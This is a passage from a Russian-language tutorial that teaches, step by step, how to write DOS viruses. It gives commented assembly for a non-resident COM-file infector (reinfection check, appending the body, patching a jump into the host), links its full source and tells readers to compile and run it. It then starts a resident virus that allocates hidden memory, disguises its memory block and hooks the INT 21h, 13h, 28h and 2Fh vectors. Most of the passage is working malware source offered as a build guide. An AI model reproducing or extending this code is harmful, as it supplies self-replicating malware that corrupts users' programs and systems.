<p>Вы уже, конечно, поняли,что вирус будет округлять размер заражаемой программы до целого числа параграфов в большую сторону. Например, пусть файл имеет длину 401 байт. Тогда вирус запишет в DI значение 416 (25 целых параграфов, и еще один байт даст округленное значение 416 ). В "new_bytes" запишется число : 416 - 3 = 413, а в "add_to_ds" будет помещено значение : 26 - 1 = 25. Чтобы лучше понять работу фрагмента,рекомендую вам посмотреть пункт 1.6. И еще - подумайте, зачем нужна команда " dec ax ". Надеюсь, вы без труда в этом разберетесь!</p>
<h4><a name="p11c">1.12 Проверяем файл на зараженность</a></h4>
<p>Мы, кажется, слишком увлеклись работой и не заметили одной очень важной детали. Ведь может случиться, что найденный нами файл уже заражен предлагаемым вирусом, а мы об этом даже не догадываемся! Поэтому наш вирус заразит эту программу еще раз. В принципе,количество заражений ничем не ограничено. Программа будет расти, пока не достигнет размера более 65535 байт, а после этого перестанет работать. Чтобы такого не произошло, введем проверку на зараженность. Например, в конец каждого заражаемого файла будем записывать цифру " 7 ", а при заражении проверять ее наличие. Итак:</p>
<pre class="source">
	       mov ax,4200h           ;Установим ука-
	       xor cx,cx              ;затель на пос-
	       dec si                 ;ледний байт
	       mov dx,si              ;файла. ..
	       int 21h
	       jnc read_last
	       jmp close              ;Ошибка !

    read_last:                        ;И считаем этот
	       mov ah,3fh             ;байт в ячейку
               mov cx,1               ; " last ". ..
	       lea dx,last
	       int 21h
	       jc close               ;Ошибка !

	       cmp last,'7'           ;" last " =" 7 "
	       jne write_vir          ;Нет - дальше
	       jmp find_next          ;Да- поищем дру-
                                      ;гой файл. ..
</pre>
<p>Можно, конечно,провести более совершенную проверку зараженности,нашей же целью было просто показать, как защитить файлы от повторного заражения. Читатель при желании сам легко внесет необходимые изменения в создаваемую программу.</p>
<h4><a name="p11d">1.13 Заражаем COM - программу</a></h4>
<p>Наконец, подходящий для заражения COM - файл найден. Он еще не заражен нашим вирусом и имеет приемлемый размер. Поэтому самое время заняться заражением. Этот процесс <a href="#p113">описан в 1.3</a> (см. п.3 и п.4). Здесь мы только его реализуем:</p>
<pre class="source">
    write_vir: mov ax,4200h           ;Установим  ука-
	       xor cx,cx              ;затель на конец
	       mov dx,di              ;файла. ..
	       int 21h
	       jc close               ;При ошибке -
	                              ;закроем файл
               mov ah,40h             ;Запишем  в файл
               mov cx,vir_len         ;код вируса дли-
               lea dx,vir             ;ной vir_len
               int 21h
               jc close	              ;При ошибке -
	                              ;закроем файл
    write_bytes:
	       mov ax,4200h           ;Установим  ука-
	       xor cx,cx              ;затель на нача-
	       xor dx,dx              ;ло файла
	       int 21h
               jc close               ;При ошибке -
	                              ;закроем файл

               mov ah,40h             ;Запишем в  файл
               mov cx,3               ;первые три бай-
               lea dx,new_bytes       ;та ( команду
               int 21h                ;перехода ). ..

    close:     mov ah,3eh             ;Закроем   зара-
               int 21h	              ;женный файл. ..
</pre>
<p>При записи первых трех байт в файл помещается команда перехода на код вируса. Все остальное можно понять из приведенных комментариев.</p>
<h4><a name="p11e">1.14 Восстанавливаем DTA</a></h4>
<p>Для корректной работы зараженной программы восстановим ее DTA. Напомним,что вирус " прячет " ее в массиве "old_dta". Поэтому:</p>
<pre class="source">
    restore_dta:
	       mov cx,80h             ;Размер DTA -
                                      ;128 байт. ..
	       mov bx,80h             ;Смещение к DTA
	       lea si,old_dta         ;Адрес массива
    dta_fresh:
	       mov al,ds:[si]         ;Читаем из  мас-
                                      ;сива "old_dta"
	       mov byte ptr cs:[bx],al;байт и  перено-
                                      ;сим его в DTA
	       inc bx                 ;К новому байту
	       inc si                 ;
	       loop dta_fresh         ;Цикл 128 раз
</pre>
<h4><a name="p11f">1.15 Передаем управление зараженной программе</a></h4>
<p>Работа вируса окончена. Теперь он должен отдать управление программе - носителю.Как мы выяснили, для этой цели достаточно выполнить переход на адрес CS:100h . Поэтому занесем в стек содержимое CS, и затем - число 100h.А после этого выполним команду RET FAR. Она снимет с вершины стека записанные туда значения и передаст управление по определяемому ими адресу:</p>
<pre class="source">
	       pop ds                 ;Восстановим
                                      ;испорченный DS
	       push cs                ;Занесем в стек
                                      ;регистр CS
	       db 0b8h                ;Код команды
    jump:      dw 100h                ;mov ax,100h
	       push ax                ;Занесем в стек
                                      ;число 100h
	       retf                   ;Передача управ-
                                      ;ления на задан-
                                      ;ный адрес. ..
</pre>
<h4><a name="p11g">1.16 Область данных вирусной программы</a></h4>
<p>Настало время привести данные, которыми оперирует наш вирус. Вот они:</p>
<pre class="source">
    old_bytes db   0e9h               ;Исходные три
                                      ;байта  заражен-
              dw   vir_len + 0dh      ;ной программы
    old_dta   db   128 dup (0)        ;Здесь вирус
                                      ;хранит исходную
                                      ;DTA программы
    maska     db   '*.com',0          ;Маска для поис-
                                      ;ка файлов. ..
    fn        db   12 dup (' '),0     ;Сюда помещается
                                      ;имя файла -жер-
                                      ;твы. ..
    new_bytes db   0e9h               ;Первые три бай-
              db   00h	              ;та вируса в
              db   00h		      ;файле. ..

    last      db   0                  ;Ячейка для пос-
                                      ;леднего байта
              db   '7'                ;Последний байт
                                      ;вируса в файле
</pre>
<p>Как видим, данных не так уж и много!</p>
<h4><a name="p11h">1.17 Завершаем запускающую программу</a></h4>
<p>Для завершения запускающей вирус программы мы используем стандартную функцию DOS, а именно - 4Ch:</p>
<pre class="source">
    vir_len   equ   $-vir             ;Длина вирусного
                                      ;кода. ..

    prg_end:   mov ah,4ch             ;Завершение  за-
               INT 21H                ;пускающей прог-
                                      ;раммы. ..

              db '7'                  ;Без этого  сим-
                                      ;вола вирус  за-
                                      ;разил бы сам
                                      ;себя. ..

    prg ends                          ;Все ASM - прог-
    end start                         ;раммы  заканчи-
                                      ;ваются примерно
                                      ;так. 
</pre>
<p>Вы, наверное, заметили,что в запускающей программе при восстановлении первых трех байт по адресу CS:100h записывается команда перехода на метку "prg_end". После передачи управления на эту метку вирус отдает управление MS DOS. Если бы в самом начале нашего вируса не было команды "jmp vir" (<a href="#p116">см. 1.6</a>), то запись по адресу CS : 100h перехода на метку "prg_end" разрушила бы команды</p>
<pre class="source">
               push ax
               mov ax,ds
</pre>
<p>(<a href="#p116">см. 1.6</a>).В результате в заражаемый файл попал бы вирусный код с испорченными первыми байтами. Это наверняка привело бы к полной неработоспособности файла - жертвы. В нашем же случае будет разрушена лишь команда " jmp vir ". Поскольку в файл она не записывается, нас это не интересует.</p>
<h4><a name="p11i">1.18 Текст нерезидентного COM - вируса</a></h4>
<p>Как видите, вирус написан, и пора привести его текст. Этим мы сейчас и займемся:</p>
<p><a href="files/vik00_ru/comnotsr.asm">Исходный текст comnotsr.asm (10K)</a></p>
<p>Если вы когда нибудь читали [3], только что приведенная программа покажется вам знакомой. Строго говоря, наш вирус написан "по мотивам" этой в общем совсем неплохой книги. "Книжный" вирус существенно переработан, исправлены замеченные ошибки и глюки. Несмотря на это поступок автора трудно назвать плагиатом. Просто затронутая в работе П. Л. Хижняка тема получила новое развитие.</p>
<h4><a name="p11j">1.19 Комментарии</a></h4>
<p>Вирус, который мы разработали, отыскивает программы для заражения лишь в том каталоге, из которого был запущен зараженный файл. Понятно,что в этом случае большой заразностью он не обладает.Но во - первых, мы идем от простого к сложному, и следующие наши программы будут более эффективными. А во - вторых, эта разработка лишь преследовала цель показать основные приемы изготовления вирусных программ. Кроме того, чрезмерная сложность наверняка отпугнула бы читателя.</p>
<h4><a name="p11k">1.20 Испытание вируса</a></h4>
<p>Для проверки в действии разработанной нами программы просто скопируйте ее в отдельный файл (конечно, только если у вас есть дискета с текстом книги). Далее скопируйте в каталог с вирусом несколько COM - файлов. Откомпилируйте исходный текст и запустите полученный COM - файл,содержащий в себе вирусный код.Проблем с компиляцией быть не должно, так как программа тщательно тестировалась. Понаблюдайте, как вирус заражает файлы. Попробуйте запустить зараженную программу под управлением отладчика и в автоматическом режиме. И, наконец, проверьте зараженную программу с помощью DOCTOR WEB.</p>
<h3><a name="p12">Глава 2. Разработка резидентной вирусной программы</a></h3>
<h4><a name="p121">2.1 Понятие резидентного (TSR) вируса</a></h4>
<p>Резидентными называют вирусы, которые после запуска зараженной программы помещают свой код в оперативную память. Этот код "занимается" заражением файлов и находится в памяти в течение всего сеанса работы. Резидентные вирусы обычно намного заразнее нерезидентных и распространяются быстрее. Однако создать такой вирус не так просто. Кроме того, резидентные вирусные программы подвержены всевозможным сбоям и могут конфликтовать с установленным на компьютере программным обеспечением. Но несмотря на все трудности, возникающие при разработке резидентных вирусов, их было создано великое множество. В предлагаемой вниманию читателей главе рассказывается о приемах создания TSR - вирусов, поражающих COM - файлы. Кроме того, освещаются основные проблемы, с которыми приходится встречаться при их разработке.</p>
<h4><a name="p122">2.2 Несколько слов о резидентных программах</a></h4>
<p>Вы, наверное, знаете, как строятся резидентные программы. В этом пункте мы немного поговорим об их организации и функционировании. Резидентными называют программы, которые после своего завершения остаются в памяти и активизируются при наступлении каких - либо событий в вычислительной системе. Такими событиями могут быть, например, нажатие "горячей" комбинации клавиш, выполнение некоторых операций с дисками и т. п. Но в любом случае программа получает управление при тех или иных условиях.</p>
<p>Все резидентные программы строятся одинаково, или почти одинаково, и состоят из двух секций - секции инициализации и собственно резидентной части. Резидентная часть, как правило, состоит из одной или нескольких подпрограмм - обработчиков прерываний и находится в памяти во время сеанса работы компьютера. Такие подпрограммы могут полностью подменять собой системные обработчики или только служить их дополнением.Естественно,для того,чтобы резидентная часть получила управление, необходимо заменить соответствующие вектора в таблице векторов прерываний на точки входа в заново установленные обработчики. Эту функцию и выполняет секция инициализации, которая всегда выполняется при запуске программы первой.</p>
<p>После перехвата прерываний, которые должна обрабатывать резидентная часть, секция инициализации завершает программу, используя для этой цели прерывание или функцию резидентного завершения MS DOS. В результате резидентная часть остается в памяти и активизируется в случаях, предусмотренных автором программы. Часть инициализации в процессе работы больше не потребуется,поэтому оставлять ее в памяти бессмысленно, и она "затирается" MS DOS в случае необходимости.</p>
<h4><a name="p123">2.3 Алгоритм работы резидентного COM - вируса</a></h4>
<p>Рассмотрим один из возможных алгоритмов работы резидентного COM - вируса. По своей сути резидентный вирус отличается от обычной резидентной программы только тем, что он размножается сам по себе, независимо от желания пользователя. Значит, построить его можно по той же схеме, по которой пишутся обычные TSR - программы. Но сначала выясним, что должны делать секция инициализации вируса и его резидентная часть.</p>
<p>Итак:</p>
<p>Секция инициализации выполняет следующие действия:</p>
<ol>
<li>Получает управление при запуске зараженной программы.</li>
<li>Проверяет, установлена ли в память резидентная часть вируса.</li>
<li>Восстанавливает в памяти компьютера исходные три байтa этой программы.</li>
<li>Если резидентная часть не установлена, выполняются следующие действия:
<ol type="a">
<li>Отыскивается свободный блок памяти достаточного для размещения вируса размера.</li>
<li>Код вируса копируется в найденный блок памяти.</li>
<li>В таблице векторов прерываний соответствующие вектора заменяются точками входа в вирусные обработчики.</li>
<li>Выполняется переход на начало зараженной программы (на адрес CS:100h). После этого программа выполняется, как обычно.</li>
</ol></li>
</ol>
<p>В том случае, если резидентная часть вируса уже находится в памяти, он просто передает управление зараженной программе.</p>
<p>Резидентная часть выполняет следующие действия:</p>
<ol>
<li>Анализирует все вызовы системного прерывания INT 21h с целью выявить переход оператора в новый каталог или смену текущего диска.</li>
<li>Если обнаружится смена текущего диска или каталога, резидентная часть должна:
<ol type="a">
<li>Сохранить исходное состояние вычислительной системы.</li>
<li>Найти на диске подходящий COM - файл.</li>
<li>Записать тело вируса в конец этого файла.</li>
<li>Заменить первые три байта заражаемой программы командой перехода на вирусный код, сохранив предварительно исходные три байта в своей области данных.</li>
<li>Восстановить исходное состояние вычислительной системы и передать ей управление.</li>
</ol></li>
</ol>
<p>Если оператор не будет менять текущий католог или диск, вирус, очевидно, ничего заразить не сможет.</p>
<p>Как вы уже заметили, заражением файлов занимается исключительно резидентная часть ! Секция инициализации нужна только для инсталляции вируса в память. Кроме того, в отличие от обычной резидентной программы, в вирусе эта секция записывается в память вместе с резидентной частью. Иначе при записи ее в заражаемый файл возникли бы серьезные трудности.</p>
<p>Из рассказанного в этом пункте легко сделать вывод о том, насколько резидентный вирус должен быть устроен сложнее обычного. Вместе с тем, в его написании нет ничего магического, и вы без труда разберетесь в следующей программе.</p>
<h4><a name="p124">2.4 Заголовок вируса</a></h4>
<p>Для разработки вируса мы, как и раньше, будем использовать COM формат. Естественно,в резидентном вирусе будут использованы некоторые блоки, созданные нами в предыдущей главе. Поэтому на их работе мы останавливаться не будем, а вместо этого сделаем акцент на новых приемах, реализованных в программе.</p>
<p>Итак, начнем:</p>
<pre class="source">
    prg segment
       assume cs:prg,ds:prg,es:prg,ss:prg
          org 100h

    start:     jmp vir                ;Передача управ-
                                      ;ления вирусному
                                      ;коду. ..
	       org 110h
</pre>
<p>Приведенные команды и директивы выполняют те же самые функции, что и аналогичные, использованные нами при создании нерезидентной вирусной программы.</p>
<h4><a name="p125">2.5 Вирус начинает работу</a></h4>
<p>Несколько забегая вперед, отметим, что наш вирус будет работать так:</p>
<ol>
<li>Обработчик прерывания Int 21h отслеживает смену оператором текущего каталога или диска. Если пользователь действительно сменил диск или каталог,то переменная TG_INFECT устанавливается в единицу.</li>
<li>Обработчик прерывания Int 28h вызывается DOS всякий раз, когда можно, не боясь зависаний, обращаться к системным функциям, работающим с файлами. Поэтому естественно возложить на него задачу поиска и заражения файлов. Исходя из этого процедура обработки Int 28h проверяет значение TG_INFECT, и если оно равно единице, выполняет поиск и заражение файлов.</li>
</ol>
<p>После перехода на метку " vir " начинается исполнение вирусной программы. Поэтому продолжим: (Собственно это и есть начало обработчика прерывания Int 28h)</p>
<pre class="source">
    vir:       db 0ebh                ;90h - Для рези-
               db push_len            ;90h   дентной
                                      ;      работы. 

               pushf                  ;Запишем флаги
                                      ;в стек. ..
               cmp cs:tg_infect-110h,1;Активизиро-
                                      ;ваться ?
               je cs:vir_2            ;Да. ..
               call dword ptr cs:old_28h - 110h
                                      ;Нет - вызовем
                                      ;старый обработ-
                                      ;чик INT 28h,
                                      ;чтобы не топить
                                      ;другие TSR. ..
               iret

    vir_2:     popf                   ;Переключаем
                                      ;стек для TSR -
                                      ;исполнения на
               mov cs:ss_save-110h,ss ;себя. ..
               mov cs:sp_save-110h,sp
               mov cs:help_word - 110h,cs
               mov ss,cs:help_word - 110h
               mov sp,to_newstack + 136
               mov cs:tg_infect - 110h,0
               pushf                  ;Вызываем старый
               db 9ah                 ;обработчик
    old_28h    dw 0                   ;INT 28h. ..
    old_28h_2  dw 0
</pre>
<p>Обратите внимание на команду, записанную в машинном коде сразу за меткой "vir". Сейчас мы попробуем разобраться, зачем она потребовалась.</p>
<p>Как вы знаете, наш вирус должен быть резидентным и состоять из двух частей. При этом секция инициализации исполняется только в транзитном (нерезидентном) режиме, а резидентная часть - только в резидентном.</p>
<p>Команда</p>
<pre class="source">
               db 0ebh                ;90h - Для рези-
               db push_len            ;90h   дентной
                                      ;      работы. 
</pre>
<p>играет роль "переключателя" между транзитным и резидентным кодами. При заражении вирус записывает в файл команду перехода, которая при запуске зараженного файла передает управление на "push_len" байт вперед, где как раз и начинается секция инициализации. Если же попытаться выполнить эту команду в резидентном режиме, т. е. когда код вируса получил управление, находясь в памяти,это приведет к зависанию компьютера. Чтобы такого не происходило, секция инициализации при установке вирусного кода в память записывает сразу за меткой "vir" две команды "NOP", или код: 9090h.</p>
<p>Все приведенные далее команды относятся к резидентной части. После записи флагов в стек вирус проверяет состояние переменной " tg_infect ", и если она равна " 1 ", переходит к метке " vir_2 ". Если же "tg_infect" равна " 0 ",то вирус просто вызывает старый обработчик INT 28h и отдает управление прерванному процессу.Чуть позже мы рассмотрим, как формируется значение переменной "tg_infect" . Поскольку приводимый обработчик активно работает со стеком,есть смысл предусмотреть в нем собственный стек. Поэтому сразу за меткой " vir_2 " запишем команды, переключающие стек на специальную область данных вируса "newstack":</p>
<pre class="source">
                                      ;Переключаем
                                      ;стек для TSR -
                                      ;исполнения на
               mov cs:ss_save-110h,ss ;себя. ..
               mov cs:sp_save-110h,sp
               mov cs:help_word - 110h,cs
               mov ss,cs:help_word - 110h
               mov sp,to_newstack + 136
               mov cs:tg_infect - 110h,0
</pre>
<p>Последней запишем команду, сбрасывающую "tg_infect" в ноль. Этим мы защитим вирусный код от повторного вхождения. Теперь необходимо вызвать старый обработчик INT 28h, иначе наш вирус будет " топить " другие резидентные программы, которые перехватывают это же прерывание. Поэтому запишем:</p>
<pre class="source">
               pushf                  ;Вызываем старый
               db 9ah                 ;обработчик
    old_28h    dw 0                   ;INT 28h. ..
    old_28h_2  dw 0
</pre>
<p>Обработчик здесь вызывается как дальняя процедура. Команда "CALL" записана в виде машинного кода, а поля "old_28h" и "old_28h_2" заполняются секцией инициализации при установке вируса в память.</p>
<p>* Обратите внимание на команды переключения стека. Они необычны тем,что от адреса ячеек памяти "ss_save", "sp_save", "tg_infect" и "help_word" отнимается число 110h. Дело в том, что при компиляции исходного текста COM - программы адреса ячеек памяти вычисляются исходя из того, что DS указывает на начало ее PSP. Кроме того, в самом начале вируса мы записали директиву "org 110h". Но ведь к вышеуказанным ячейкам памяти вирус обращается в резидентном режиме, да еще и относительно CS. А CS указывает строго на начало обработчика, а не на начало PSP, как это было при компиляции! Поэтому относительный адрес ячеек необходимо уменьшить на 110h, что мы и сделали. Этот прием будет использован еще несколько раз при построении вирусных обработчиков прерываний, поэтому полезно будет понять, на чем он основан.</p>
<h4><a name="p126">2.6 Сохраняем регистры процессора</a></h4>
<p>В самом начале работы резидентная программа обязана сохранить значения регистров процессора, которые были переданы ей прерванной программой, а при завершении работы - восстановить эти значения. Если этого не сделать,прерванная программа просто не сможет нормально выполняться дальше, что приведет к сбою вычислительного процесса. Поэтому сейчас мы сохраним все регистры, используемые вирусом, в стеке:</p>
<pre class="source">
               pushf                  ;Сохраним в сте-
               push ax                ;ке регистры. ..
               push bx
               push cx
               push dx
               push si
               push di
               push bp
               push ds
               push es
               jmp cs:infect          ;Перейти к зара-
                                      ;жению файлов
</pre>
<p>Заметим, что значения регистров записываются уже в область " newstack ", а не в стек прерванной программы. Значения SS и SP сохраняются в переменных: "ss_save" и "sp_save", и поэтому в стек не заносятся. Команда "jmp cs:infect" также относится к резидентной секции и передает управление "заразной" части вирусного кода.</p>
<h4><a name="p127">2.7 Создаем секцию инициализации</a></h4>
<p>А теперь пора заняться изготовлением секции инициализации нашей программы. Поскольку эта секция исполняется при запуске зараженного файла, выполним коррекцию регистра DS (<a href="#p116">см. гл. 1, 1.6</a>):</p>
<pre class="source">
               push_len equ $-vir - 2

               mov ax,ds              ;Корректируем DS
                                      ;для нерезидент-
                                      ;ной работы. ..
               db 05h                 ;Код команды
    add_to_ds: dw 0                   ;" ADD AX,00h "
	       mov ds,ax
</pre>
<p>Константа " push_len " содержит смещение от начала вируса до начала секции инициализации. Именно это число записывается за меткой " vir " (<a href="#p125">см. п. 2.5</a>). Далее следует проверить наличие вируса в памяти (<a href="#p123">см. п. 2.3</a>), поэтому:</p>
<pre class="source">
               mov ax,0f000h          ;Проверим, есть
               mov bx,1997h           ;вирус в памяти,
               int 2fh                ;или еще нет. ..
               jc fresh_bytes

       	       cmp al,0ffh
      	       jne free_mem           ;Нет -
                                      ;устанавливаем
</pre>
<p>Для проверки используется так называемое мультиплексное прерывание MS DOS, специально предназначенное для использования в резидентных программах. В регистрах AX и BX мы поместим код, на который реагирует вирусный обработчик этого прерывания, и выполним команду " INT 2Fh ". Если вирус был установлен в памяти, его обработчик проанализирует значения AX и BX. И если они равны " 0f000h " и " 1997h ", вернет в AL число 0ffh, которое и рассчитывает получить секция инициализации. Если вирусный код уже инсталлирован, необходимо: восстановить в памяти компьютера исходные три байта зараженной программы (<a href="#p123">см. п. 2.3</a>):</p>
<pre class="source">
    fresh_bytes:                      ;Восстанавливаем
	       mov al,old_bytes       ;первые три бай-
                                      ;та зараженной
	       mov cs:[100h],al       ;программы. ..
	       mov al,old_bytes+1
	       mov cs:[101h],al
	       mov al,old_bytes+2
	       mov cs:[102h],al
</pre>
<p>Восстановить значения сегментных регистров:</p>
<pre class="source">
               mov ax,cs              ;Восстанавливаем
                                      ;сегментные
               mov es,ax              ;регистры. ..
               mov start_cs,ax
               mov ds,ax
</pre>
<p>И выполнить переход на начало этой программы:</p>
<pre class="source">
               jmp cl_conv_1          ;Передаем управ-
    cl_conv_1: db 0eah                ;ление заражен-
               dw 100h                ;ной программе
    start_cs   dw 0
</pre>
<p>Здесь команда "jmp cl_conv_1" очищает очередь процессора (<a href="#p117">см. гл. 1, п. 1.7</a>). Без нее наш вирус на некоторых процессорах работал бы некорректно. Если же вируса в памяти еще нет, нужно установить его в память. Эту работу выполняют команды, записанные за меткой "free_mem".</p>
<h4><a name="p128">2.8 Запрашиваем блок памяти</a></h4>
<p>Как вы уже знаете,резидентная программа должна находиться в памяти в течение сеанса работы компьютера. Поэтому секция инициализации должна "попросить" MS DOS выделить для загрузки резидентной части соответствующий блок памяти. Существует целый ряд методов, позволяющих получить в распоряжение TSR - программы область памяти достаточного размера. Например, в обычных резидентных программах эту функцию выполняет MS DOS в процессе резидентного завершения. При этом область памяти, выделенная TSR - программе при ее запуске, просто усекается до размера резидентной части и остается занятой после завершения программы. Таким образом, резидентная часть размещается в том месте, куда некогда была загружена вся программа.</p>
<p>К сожалению, использование такого метода в вирусе порождает целый ряд проблем. Например в этом случае необходимо записывать вирусный код в начало, а не в конец файла - жертвы, иначе при запуске зараженной программы она будет " садиться " в память целиком. Есть и другие трудности, преодолеть которые очень непросто.Не случайно такой прием при написании вирусов применяется редко.</p>
<p>Другой способ состоит в использовании для поиска подходящего блока памяти так называемых MCB - блоков (потом мы поговорим о них подробнее). При этом вирус должен путем сканирования цепочки блоков управления памятью (Memory Control Blocks) найти свободный блок подходящего размера, разделить его на две части, одна из которых точно соответствует или несколько превышает длину вируса, и записать во вновь созданный блок свой код.Основной недостаток данного метода состоит в том что MCB - блоки являются недокументированной структурой MS DOS, и при их использовании нужно быть готовым к тому,что программа будет работать на одной машине и не будет работать на другой. Это также относится к разным версиям операционной системы. Кроме того, очень сложно построить эффективный алгоритм реализации этого метода. Ведь вирусный код должен записываться не просто в подходящий по размерам блок, а в старшие адреса оперативной памяти, иначе загрузка больших программ будет просто невозможна.</p>
<p>Третий способ заключается в том, что код вируса копируется в заданную область памяти без коррекции MCB - блоков. Недостаток его состоит в следующем: "время жизни" вируса,реализующего такой алгоритм, чрезвычайно мало и зависит от интенсивности использования оперативной памяти. Причем "гибель" вирусной программы с почти стопроцентной вероятностью приводит к повисанию компьютера. Хотя метод отличается простотой реализации и имеет ряд других достоинств, приведенный выше недостаток делает его практическое использование маловозможным. Четвертый способ состоит в использовании функций, реализующих управление памятью.Используя его,можно построить эффективный и корректно работающий программный код, который будет хорошо работать на разных машинах и с любыми версиями операционной системы. При этом его реализация весьма проста и понятна. Поэтому мы применим именно этот способ:</p>
<pre class="source">
    free_mem:  mov ah,4ah             ;Определим объем
                                      ;доступной памя-
                                      ;ти. ..
               mov bx,0ffffh          ;Заведомо невоз-
               int 21h                ;можное значение
                                      ;(0ffffh) !
                                      ;Ошибка будет
                                      ;обязательно, и
                                      ;проверять ее
                                      ;наличие
                                      ;не нужно !
    ; _______________________________________________
    ;| Закажем свободный блок памяти,чтобы можно было|
    ;| записать в него резидентную часть вируса. ..  |
    ;|_______________________________________________|

               sub bx,vir_par + 2     ;Оставим вирусу
                                      ;на 2 параграфа
                                      ;больше, чем
                                      ;он сам занимает
               mov ah,4ah	      ;А остальная па-
               int 21h                ;мять будет
               jc fresh_bytes         ;занята. ..

               mov ah,48h             ;Попросим DOS
                                      ;отдать свобод-
                                      ;ный блок нам. 
               mov bx,vir_par + 1     ;Запас в один
               int 21h                ;параграф. ..
               jc fresh_bytes         ;Ошибка !
</pre>
<p>В приведенном фрагменте использованы функции:</p>
<dl>
<dt>4Ah</dt><dd>изменение размера блока памяти, а также</dd>
<dt>48h</dt><dd>выделение блока памяти.</dd>
</dl>
<p>Об их использовании вы можете прочесть в ПРИЛОЖЕНИИ 1.</p>
<p>Работа вышеприведенных команд весьма проста и особых пояснений не требует. Стоит лишь заметить, что для загрузки вирусного кода выделяется область в самом "верху" свободной оперативной памяти, что является почти обязательным для подавляющего большинства вирусных программ.</p>
<h4><a name="p129">2.9 Делаем вирус "незаметным"</a></h4>
<p>К сожалению, выбранный нами способ поиска свободного блока памяти имеет один скрытый недостаток. Как вы, наверное, знаете, при завершении программы DOS освобождает блок памяти, который эта программа занимает. Кроме того, освобождаются также все блоки, которые были распределены программе по ее запросам. Предположим, вирус стартовал из зараженной программы, с помощью описанных ранее функций MS DOS нашел подходящий блок памяти и записал в него свой код, предварительно переписав на этот код те или иные прерывания. После этого он передает управление зараженной программе. Естественно, она когда-нибудь завершится и передаст управление DOS. Но ведь в этом случае блок, который занимает вирусный код, будет освобожден, и при первой необходимости этот код будет уничтожен,чтобы записать на его место другую информацию !В результате произойдет моментальное " повисание " компьютера.</p>
<p>Очевидно, этого можно избежать, если память, занимаемая вирусом, будет оставаться занятой в течение всего сеанса работы,и не будет освобождаться после завершения зараженной программы.</p>
<p>Как показал эксперимент, для этой цели достаточно в MCB,предшествующем выделенному для вирусного кода блоку, сделать определенные изменения. Но сначала мы немного расскажем о структуре Memory Control Blocks (MCB) и их использовании.</p>
<p>Для того, чтобы следить за использованием памяти, в MS DOS предусмотрена специальная структура - так называемый блок управления памятью,или MCB - блок. Такой блок помещается DOS непосредственно перед каждым вновь выделяемым блоком памяти, и система ведет специальный список MCB - блоков,просматривая его при выполнении тех или иных действий, связанных с распределением памяти.</p>
<p>MCB обязательно начинается на границе параграфа и всегда занимает целый параграф.Конечно,MS DOS должна знать о том, где именно расположен первый блок управления памятью.На этот блок указывает внутренняя переменная DOS, значение и местоположение которой известно только операционной системе.</p>
<p>Рассмотрим теперь структуру MCB - блока. Итак:</p>
<table border="1" cellspacing="0" cellpadding="0" summary="структура MCB блока">
<tr><td>Байт 0</td><td>содержит код 5Ah,если данный блок является последним в цепочке MCB, и код 4Dh - в противном случае.</td></tr>
<tr><td>Байты 1,2</td><td>Содержат PID (Program IDentificator) программы, для которой DOS выделяла блок, или ноль, если блок свободен.</td></tr>
<tr><td>Байты 3, 4</td><td>Содержат размер блока в параграфах. Следующий блок расположен в памяти по адресу: MCB_NEW = MCB_OLD + lenght + 1. Здесь MCB_NEW - сегментный адрес, по которому располагается следующий MCB, MCB_OLD - сегментный адрес рассматриваемого MCB,а lenght - содержимое байтов 3, 4 этого блока.</td></tr>
</table>
<p>Остальные одиннадцать байт блока не используются и могут содержать любые данные. Но стоит заметить, что повреждение байтов 1, 3 или 4 приводит к выдаче сообщения:</p>
<pre>
       Memory Allocation Error
       System Halted
</pre>
<p>и немедленному "зависанию" компьютера.</p>
<p>А теперь вернемся к нашей программе.</p>
<p>Как показал эксперимент, достаточно подменить в MCB, предшествующем вирусному коду, байты 1 и 2. Причем лучше всего записать вместо этих байт PID какой - нибудь из уже загруженных в память программ. Этим достигается еще и незаметность вируса в памяти.Советую вам попробовать загрузить несколько TSR - программ и в MCB одной из них подменить байты 1 и 2 на PID какой - нибудь другой программы. После этого нажмите в Volkov Commander клавиши ALT и F5, и вы увидите очень интересный эффект.</p>
<p>Но дело в том, что для использования вышеприведенного метода необходимо еще найти программу, на PID которой наш вирус будет " паразитировать ". Сделать это не так просто, как может показаться на первый взгляд. И поэтому для облегчения нашей работы вместо PID загруженной в память программы мы запишем в MCB вируса сегментный адрес области данных DOS, а именно : 0070h:</p>
<pre class="source">
    ; _______________________________________________
    ;| Теперь свободный блок памяти найден           |
    ;| ( сегментный адрес в AX ), и                  |
    ;| нужно записать в него код вируса. ..          |
    ;|_______________________________________________|

               xor di,di              ;Делаем вирус
               mov bx,ax              ;"невидимым" в
               dec bx                 ;памяти. ..
               mov word ptr cs:[2],bx
               mov es,bx
               mov bx,0070h
               mov es:[di+1],bx
</pre>
<p>Предыдущий фрагмент вернул нам сегментный адрес выделенного для вируса блока памяти в регистре AX. Приведенные программные строки очень просты, и объяснять их работу не нужно. Следует только сказать, что вирус фактически отнимает у DOS несколько килобайтов памяти, поэтому необходимо скорректировать PSP программы - носителя вируса. А именно уменьшить верхнюю границу блока памяти, выделенного программе, на длину вирусного кода. Интересующая нас величина находится по смещению 02h от начала PSP.</p>
<h4><a name="p12a">2.10 Получаем вектора прерываний</a></h4>
<p>Итак, мы нашли блок памяти, в который часть инициализации будет копировать вирусный код. Но прежде чем инсталлировать вирус в память, необходимо узнать адреса системных обработчиков прерываний. Ведь вирус будет вызывать эти обработчики перед (или после) выполнением собственных действий по обработке того или иного прерывания. Если исходные обработчики не будут получать управление, вычислительная система придет в аварийное состояние.</p>
<p>Поэтому:</p>
<pre class="source">
    ;_________________________________________________

               mov es,di              ;Получаем векто-
                                      ;ра прерываний
               cli
               mov di,084h            ;Int 21h. ..
               mov bx,es:[di]
               mov old_21h,bx
               mov bx,es:[di+2]
               mov old_21h_2,bx

               mov di,0bch            ;Int 2fh. ..
               mov bx,es:[di]
               mov old_2fh,bx
               mov bx,es:[di+2]
               mov old_2fh_2,bx

               mov di,04ch            ;Int 13h. ..
               mov bx,es:[di]
               mov old_13h,bx
               mov bx,es:[di+2]
               mov old_13h_2,bx

               mov di,0a0h            ;Int 28h. ..
               mov bx,es:[di]
               mov old_28h,bx
               mov bx,es:[di+2]
               mov old_28h_2,bx
               sti
</pre>
<p>Как видим, для определения адресов обработчиков вирус обращается непосредственно к таблице векторов прерываний.Секция инициализации будет перехватывать прерывания: Int 21h, Int 13h, Int 28h и Int 2fh. Несколько позже мы разберемся, почему потребовалось перехватить именно их и приведем тексты вирусных обработчиков этих прерываний.</p>
<h4><a name="p12b">2.11 Копируем вирусный код в память</a></h4>
